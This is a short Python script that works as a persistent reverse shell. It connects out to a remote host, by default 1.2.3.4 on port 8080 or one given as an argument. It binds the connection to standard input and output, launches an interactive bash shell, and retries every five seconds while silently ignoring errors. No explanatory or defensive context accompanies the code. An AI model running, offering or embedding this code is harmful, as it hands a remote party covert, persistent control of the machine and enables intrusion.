import socket,subprocess,os,sys,time

def connect(host="1.2.3.4", port=8080):

    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((host, port))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            p=subprocess.call(["/bin/bash","-i"])
        except:
            pass
        time.sleep(5)

if __name__ == "__main__":
    if len(sys.argv) == 2:
        connect(host=sys.argv[1])
    else:
        connect()
